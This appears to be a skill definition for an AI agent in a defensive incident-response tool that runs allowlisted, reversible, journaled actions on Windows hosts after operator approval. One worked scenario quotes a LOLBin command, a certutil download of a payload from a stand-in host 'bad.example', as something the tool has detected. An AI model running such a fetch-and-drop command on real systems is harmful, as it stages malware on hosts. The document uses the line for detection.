---
name: rmagent-actuate
description: >
  The actuation layer of the RMAgent security observatory — Phase 1 response.
  Where rmagent-windows (Phase 0) watches and writes holes and rmagent-redteam
  tests the watcher, this skill ACTS on what Phase 0 finds, but only through a
  controlled, reversible, audited pipeline: every action changes a production
  host. Use when a witnessed finding requires a response (disable an account,
  stop a service, quarantine a host) and a maker/checker record exists. Requires
  explicit operator approval per action; refuses unscoped or unrecorded changes.
---

# RMAgent Actuate — Phase 1 response

You operate the **actuation layer** of the RMAgent security observatory. Phase 0
(`rmagent-windows`) watches and writes holes; `rmagent-redteam` tests the watcher.
This skill **acts** on what Phase 0 finds — but only through a controlled,
reversible, audited pipeline.

**This is the dangerous skill.** Every action here changes a production host.

That is why it exists behind three gates: an **allowlist of named actions**
(no arbitrary shell, ever), a **dry-run-first policy** (every action shows you
exactly what it will do before it does it), and a **journal** (every action is
recorded with its undo, and every undo is verified).

## The philosophy

Phase 0's discipline was "watch, never touch." Phase 1 keeps the same shape but
inverts the verb: **act, but only reversibly.** The unit of work is not a command —
it is an *action* with:

1. A **name** from the allowlist (you cannot invent one)
2. A **target** witness from the inventory
3. A **reason** (free text, recorded in the journal — "why did you do this?")
4. A **dry-run** that prints what would happen
5. An **undo** that reverses it, verified after running

If an action cannot be undone, it is not in this skill.

## Non-negotiables

- **Named actions only.** `actuate.py` refuses anything not in `ACTIONS`. There is
  no escape hatch, no `run_ps` passthrough, no god-shell. If a scenario needs a new
  action, the operator adds it to the allowlist by editing the skill — deliberately,
  in the light.
- **Dry-run first, always.** `--dry-run` is the default. Applying a change requires
  an explicit `--apply`. An agent must never run `--apply` without showing the
  operator the dry-run output first.
- **Every action has a verified undo.** The journal records the undo command for
  every applied action. `undo` runs it and *verifies* the reversal landed.
- **Scoped to the finding.** Actions take a target (user, task, service, IP, rule)
  derived from a Phase-0 finding — not a broad sweep. Block the attacker's IP,
  not the subnet. Disable the rogue account, not all accounts.
- **Authorised estate only.** Same rule as Phase 0: only boxes you administer.
- **The EDR still wins.** This skill complements Defender/CrowdStrike; it does not
  replace them. If the EDR can isolate the host, let it — this skill is for the
  identity-led, living-off-the-land class the EDR doesn't see.
- **Credentials never in the journal.** Same scrt-store resolution as Phase 0.
  The journal records what was done, never how it was authenticated.

## The action allowlist

| Action | What it does | Undo | Use when Phase 0 finds |
|---|---|---|---|
| `block_ip` | Windows Firewall rule denying a source IP | delete the rule | 4625 brute-force from one source (the WS1 finding) |
| `unblock_ip` | Removes a block_ip rule (idempotent) | n/a (itself an undo) | operator clears a false positive |
| `disable_user` | Disables a local account (does NOT delete) | enable_user | a rogue/duplicate admin in `sketch.new_local_admins` |
| `enable_user` | Re-enables a disabled account | disable_user | undo path |
| `remove_admin` | Removes an account from Administrators | add_admin | 4732 added an unexpected member |
| `add_admin` | Adds an account back to Administrators | remove_admin | undo path |
| `delete_task` | Deletes a scheduled task (snapshots XML to journal first) | manual — journal has the XML | 4698 created a task you don't recognise |
| `stop_service` | Stops + disables a service | start_service | 7045 installed a service you don't recognise |
| `start_service` | Re-enables + starts a service | stop_service | undo path |
| `kill_process` | Kills a process by PID (name + cmdline recorded first) | cannot undo a kill | `lolbin_spawns` shows a live malicious process |
| `quarantine_file` | Deny-execution ACL on a file path | restore_file | `pslogs`/4688 references a dropped binary |
| `restore_file` | Removes the deny ACL | quarantine_file | undo path |
| `disable_wmi_sub` | Deletes a WMI event subscription (query recorded first) | manual — journal has the query | 5861 fired (fileless persistence) |
| `snapshot` | Read-only: exports task/service/user/firewall state to the journal | n/a | BEFORE any action, to have a baseline |

`snapshot` is not really an action — it is the habit that makes the rest safe.
Run it before anything else.

## Setup (one time)

```bash
# same jump host + inventory as rmagent-windows
export SKILL_DIR=~/.claude/skills/rmagent-actuate
ls "$SKILL_DIR/scripts"/{actuate,journal}.py
ls "$SKILL_DIR/scripts/actions/windows/"   # one .ps1 per action
```

Credentials resolve identically to Phase 0 (env → `~/.rmagent/creds.json` → scrt).
No new secrets, no new doors — the same WinRM :5985 knock.

## Operating loop

```
Phase 0 finds smoke
        │
        ▼
operator (or agent) reviews the case ──── "is this real?"
        │ yes
        ▼
actuate.py snapshot --witness ws1          # baseline, always first
        │
        ▼
actuate.py <action> --witness ws1 --target <X> --reason "..." --dry-run
        │  (operator reads exactly what will happen)
        ▼
actuate.py <action> ... --apply            # the only mutating path
        │
        ▼
journal records: action, target, reason, undo, result, timestamp
        │
        ▼
Phase 0 re-checks (census/hunt) ────────── "did the action work?"
        │
        ▼
undo later with: actuate.py undo --journal-entry <id>
```

## Usage

```bash
# 1. The brute-force finding from WS1 — dry-run first
python3 "$SKILL_DIR/scripts/actuate.py" block_ip \
  --inventory ~/estate.yaml --witness ws1 \
  --target 95.142.115.12 --reason "4625 brute-force, sustained" --dry-run

# 2. Apply it
python3 "$SKILL_DIR/scripts/actuate.py" block_ip \
  --inventory ~/estate.yaml --witness ws1 \
  --target 95.142.115.12 --reason "4625 brute-force, sustained" --apply

# 3. Later, if it was wrong:
python3 "$SKILL_DIR/scripts/actuate.py" undo --journal-entry 3

# 4. See everything ever done:
python3 "$SKILL_DIR/scripts/actuate.py" journal

# 5. Baseline before any action:
python3 "$SKILL_DIR/scripts/actuate.py" snapshot --witness ws1
```

## Scenarios (worked examples)

### Scenario A — The brute-force IP (the WS1 finding, live)

Phase 0's `attest` shows `admin_fail_60s=1` sustained; `edges` shows 4624s from
`95.142.115.12`. The operator confirms the IP is not theirs.

```
actuate.py snapshot --witness ws1
actuate.py block_ip --witness ws1 --target 95.142.115.12 \
  --reason "sustained 4625 brute-force against Administrator" --dry-run
  → would create firewall rule "RMAgent-Block-95.142.115.12" (deny, any port)
actuate.py block_ip ... --apply
  → applied. journal entry 7. undo=unblock_ip 95.142.115.12
# verify with Phase 0: census shows admin_fail_60s dropping to 0 over the next minutes
```

### Scenario B — The rogue admin (4732)

`sketch.new_local_admins` reports `EVILSAUCE` was added to Administrators at
03:14. Nobody recognises it.

```
actuate.py snapshot --witness ws2
actuate.py disable_user --witness ws2 --target EVILSAUCE \
  --reason "4732 unexpected admin add at 03:14" --dry-run
actuate.py disable_user ... --apply        # account disabled, NOT deleted
actuate.py remove_admin --witness ws2 --target EVILSAUCE \
  --reason "same finding" --apply          # and out of the group
# the account still exists for forensics; it just can't log on
```

### Scenario C — The fileless persistence (5861)

`explain.wmi_subscriptions` returns a subscription whose `NotificationQuery`
is `SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance
ISA 'Win32_Service'`. Classic T1546.003.

```
actuate.py snapshot --witness ws1
actuate.py disable_wmi_sub --witness ws1 --target <SubscriptionName> \
  --reason "5861 WMI persistence, service-modification trigger" --dry-run
actuate.py disable_wmi_sub ... --apply     # journal records the full query first
# then hunt for what created it: pslogs + lolbin_spawns in the same window
```

### Scenario D — The live malicious process (4688 + cmdline)

`lolbin_spawns` shows `certutil.exe -urlcache -f http://bad.example/payload.exe
C:\Users\Public\p.exe` spawned by SYSTEM, and it's still running.

```
actuate.py snapshot --witness ws1
actuate.py kill_process --witness ws1 --target 4242 \
  --reason "certutil download of known-bad payload" --dry-run
  → would kill PID 4242 (certutil.exe) — cmdline recorded to journal first
actuate.py kill_process ... --apply
actuate.py quarantine_file --witness ws1 --target C:\Users\Public\p.exe \
  --reason "downloaded payload" --apply     # deny-execute ACL
```

### Scenario E — The dropped service (7045)

`explain.service_events` shows a new service `EvilSvc` running as LocalSystem
from `C:\Windows\Temp\evil.exe`.

```
actuate.py snapshot --witness ws2
actuate.py stop_service --witness ws2 --target EvilSvc \
  --reason "7045 unexpected LocalSystem service" --dry-run
actuate.py stop_service ... --apply          # stopped AND disabled
actuate.py quarantine_file --witness ws2 --target C:\Windows\Temp\evil.exe \
  --reason "service binary" --apply
# the service still exists (disabled) for forensics; delete deliberately later
```

## The journal

Every applied action appends one JSON line to `~/.rmagent/actuate-journal.jsonl`:

```json
{"id": 7, "t": "2026-08-19T21:40:00Z", "witness": "ws1", "action": "block_ip",
 "target": "95.142.115.12", "reason": "sustained 4625 brute-force",
 "undo": {"action": "unblock_ip", "target": "95.142.115.12"},
 "result": "applied", "verified": true}
```

`undo --journal-entry N` looks up entry N, runs its undo, and verifies. Entries
are append-only — undoing writes a *new* entry, never edits an old one. The
journal is the audit trail: read it aloud in an incident review and you have
the whole response story in order.

## What this skill will NOT do

- No arbitrary command execution. The allowlist is the whole surface.
- No deletion of accounts or logs. `disable_user` disables; it never deletes.
  `delete_task` snapshots the task XML to the journal first. Nothing touches
  the event logs.
- No `--apply` without a prior dry-run in the same session (the operator must
  have seen the plan).
- No actions against boxes outside the inventory.
- No replacing the EDR. If CrowdStrike/Defender can do it, let them.
- No silent anything. Every action prints, journals, and verifies.

## Relationship to the other skills

| Skill | Verb | Trust model |
|---|---|---|
| `rmagent-windows` | watch | full autonomy — read-only |
| `rmagent-redteam` | test | `--confirm` gate — stages reversible artifacts |
| `rmagent-actuate` | **act** | dry-run → operator sees → `--apply` → verified undo |

Phase 0 earned autonomy by being unable to cause harm. Phase 1 earns trust the
same way: every action is named, shown before it runs, journaled with its undo,
and verified reversible. The ultimate defender is not the one that acts fastest —
it is the one whose actions you can always take back.

## Supporting Files

Skill directory: ~/.claude/skills/rmagent-actuate

- scripts/actuate.py — the CLI: allowlist check, dry-run/apply, journal, undo
- scripts/journal.py — journal read/append/verify helpers
- scripts/actions/windows/*.ps1 — one payload per action (block_ip, disable_user, ...)
- examples/live-bruteforce-response.md — the WS1 IP block, end to end
- SAFETY.md — the full safety case for this skill
